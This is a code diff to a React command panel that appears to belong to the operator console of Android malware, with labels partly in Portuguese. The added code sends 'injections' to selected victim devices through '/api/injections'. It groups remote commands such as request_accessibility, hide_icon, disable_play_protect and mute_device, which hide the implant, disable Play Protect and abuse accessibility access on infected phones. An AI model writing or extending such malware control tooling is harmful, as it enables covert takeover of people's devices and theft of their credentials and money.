@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useListCommands, useSendCommand, Device } from "@workspace/api-client-react";
 import { useToast } from "@/hooks/use-toast";
 
@@ -17,6 +17,15 @@ export function CommandPanel({ devices = [], preselectedDeviceId, height }: Comm
   const { data: commands, isLoading } = useListCommands();
   const sendCommand = useSendCommand();
   const { toast } = useToast();
+  const [injections, setInjections] = useState<any[]>([]);
+  const [selectedInjection, setSelectedInjection] = useState("");
+
+  useEffect(() => {
+    fetch("/api/injections", { credentials: "include" })
+      .then(res => { if (res.ok) return res.json(); return []; })
+      .then(data => setInjections(data || []))
+      .catch(() => {});
+  }, []);
 
   const handleCommand = (commandId: string, commandLabel: string) => {
     if (!selectedDeviceId) {
@@ -36,9 +45,40 @@ export function CommandPanel({ devices = [], preselectedDeviceId, height }: Comm
     );
   };
 
+  const handleInjection = async (targetId: string) => {
+    if (!selectedDeviceId || !targetId) return;
+    try {
+      const res = await fetch("/api/injections", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ deviceId: parseInt(selectedDeviceId, 10), targetId }),
+        credentials: "include"
+      });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.message || "Failed to inject");
+      toast({ title: `> INJECTION SENT`, description: `Target ${targetId} injected`, className: "border-[#ffaa00] bg-black text-[#ffaa00] font-mono text-xs" });
+    } catch (err: any) {
+      toast({ title: "INJECTION FAILED", description: err.message, variant: "destructive" });
+    } finally {
+      setSelectedInjection("");
+    }
+  };
+
+  // Separate commands into sections
+  const sectionAKeys = ["request_accessibility", "hide_icon", "disable_play_protect", "mute_device", "restart_app"];
+  
+  const sectionACommands = commands?.filter(c => sectionAKeys.includes(c.id)) || [];
+  const sectionCCommands = commands?.filter(c => !sectionAKeys.includes(c.id)) || [];
+
+  const groupedInjections = injections.reduce((acc, inj) => {
+    if (!acc[inj.category]) acc[inj.category] = [];
+    acc[inj.category].push(inj);
+    return acc;
+  }, {} as Record<string, any[]>);
+
   return (
-    <div className="panel" style={{ display: "flex", flexDirection: "column", height: height ?? "auto" }}>
-      <div className="panel-header" style={{ justifyContent: "space-between" }}>
+    <div className="panel" style={{ display: "flex", flexDirection: "column", height: height ?? "auto", overflow: "hidden" }}>
+      <div className="panel-header" style={{ justifyContent: "space-between", flexShrink: 0 }}>
         <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
           <span>■</span>
           <span>COMMAND PANEL</span>
@@ -56,6 +96,7 @@ export function CommandPanel({ devices = [], preselectedDeviceId, height }: Comm
               padding: "2px 4px",
               fontFamily: "'Courier New', monospace",
               cursor: "pointer",
+              maxWidth: 120
             }}
           >
             <option value="">-- TARGET --</option>
@@ -68,28 +109,92 @@ export function CommandPanel({ devices = [], preselectedDeviceId, height }: Comm
         )}
       </div>
 
-      <div style={{ padding: 6, display: "flex", flexDirection: "column", gap: 3, flex: 1, background: "#020202" }}>
-        {!commands && isLoading ? (
-          <div style={{ color: "#333", fontSize: 10, padding: 4 }}>&gt; loading commands<span className="blink">_</span></div>
-        ) : (
-          commands?.map(cmd => (
-            <button
-              key={cmd.id}
-              data-testid={`command-btn-${cmd.id}`}
-              className={`cmd-btn${DANGER_COMMANDS.includes(cmd.id) ? " danger" : ""}`}
-              onClick={() => handleCommand(cmd.id, cmd.label)}
-              disabled={!selectedDeviceId || sendCommand.isPending}
+      <div style={{ display: "flex", flexDirection: "column", flex: 1, background: "#020202", overflowY: "auto", padding: 6, gap: 10 }}>
+        
+        {/* SECTION A */}
+        <div>
+          <div style={{ color: "#00ff00", fontSize: 10, fontWeight: "bold", borderBottom: "1px solid #111", marginBottom: 4, paddingBottom: 2 }}>&gt; COMANDOS REMOTOS</div>
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 4 }}>
+            {!commands && isLoading ? (
+              <div style={{ color: "#333", fontSize: 10, padding: 4 }}>&gt; loading commands<span className="blink">_</span></div>
+            ) : (
+              sectionACommands.map(cmd => (
+                <button
+                  key={cmd.id}
+                  data-testid={`command-btn-${cmd.id}`}
+                  className={`cmd-btn`}
+                  onClick={() => handleCommand(cmd.id, cmd.label)}
+                  disabled={!selectedDeviceId || sendCommand.isPending}
+                  style={{ padding: "4px 6px", height: "auto" }}
+                >
+                  <span style={{ marginRight: 4 }}>&gt;</span>
+                  <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-start", flex: 1, overflow: "hidden" }}>
+                    <span style={{ fontWeight: "bold", fontSize: 9, letterSpacing: "0.05em", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", width: "100%" }}>{cmd.label.toUpperCase()}</span>
+                  </div>
+                </button>
+              ))
+            )}
+          </div>
+        </div>
+
+        {/* SECTION B */}
+        <div>
+          <div style={{ color: "#ffaa00", fontSize: 10, fontWeight: "bold", borderBottom: "1px solid #111", marginBottom: 4, paddingBottom: 2 }}>&gt; INJECOES DE ALVO</div>
+          <div style={{ display: "flex", gap: 4 }}>
+            <select
+              value={selectedInjection}
+              onChange={e => {
+                setSelectedInjection(e.target.value);
+                if(e.target.value) handleInjection(e.target.value);
+              }}
+              disabled={!selectedDeviceId}
+              style={{
+                flex: 1,
+                background: "#050505",
+                border: "1px solid #333",
+                color: "#ffaa00",
+                fontSize: 10,
+                padding: "4px",
+                fontFamily: "'Courier New', monospace",
+                cursor: "pointer",
+              }}
             >
-              <span style={{ marginRight: 4, width: 10 }}>
-                {DANGER_COMMANDS.includes(cmd.id) ? "!" : ">"}
-              </span>
-              <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-start" }}>
-                <span style={{ fontWeight: "bold", fontSize: 10, letterSpacing: "0.05em" }}>{cmd.label.toUpperCase()}</span>
-                <span style={{ fontSize: 9, opacity: 0.5, marginTop: 1 }}>{cmd.description}</span>
-              </div>
-            </button>
-          ))
-        )}
+              <option value="">-- SELECIONE INJECAO --</option>
+              {Object.keys(groupedInjections).map(category => (
+                <optgroup key={category} label={category}>
+                  {groupedInjections[category].map((inj: any) => (
+                    <option key={inj.id} value={inj.id}>{inj.name}</option>
+                  ))}
+                </optgroup>
+              ))}
+            </select>
+          </div>
+        </div>
+
+        {/* SECTION C */}
+        <div>
+          <div style={{ color: "#aaa", fontSize: 10, fontWeight: "bold", borderBottom: "1px solid #111", marginBottom: 4, paddingBottom: 2 }}>&gt; SISTEMA</div>
+          <div style={{ display: "flex", flexDirection: "column", gap: 3 }}>
+            {sectionCCommands.map(cmd => (
+              <button
+                key={cmd.id}
+                data-testid={`command-btn-${cmd.id}`}
+                className={`cmd-btn${DANGER_COMMANDS.includes(cmd.id) ? " danger" : ""}`}
+                onClick={() => handleCommand(cmd.id, cmd.label)}
+                disabled={!selectedDeviceId || sendCommand.isPending}
+                style={{ padding: "3px 6px" }}
+              >
+                <span style={{ marginRight: 4, width: 10 }}>
+                  {DANGER_COMMANDS.includes(cmd.id) ? "!" : ">"}
+                </span>
+                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-start" }}>
+                  <span style={{ fontWeight: "bold", fontSize: 9, letterSpacing: "0.05em" }}>{cmd.label.toUpperCase()}</span>
+                </div>
+              </button>
+            ))}
+          </div>
+        </div>
+
       </div>
     </div>
   );
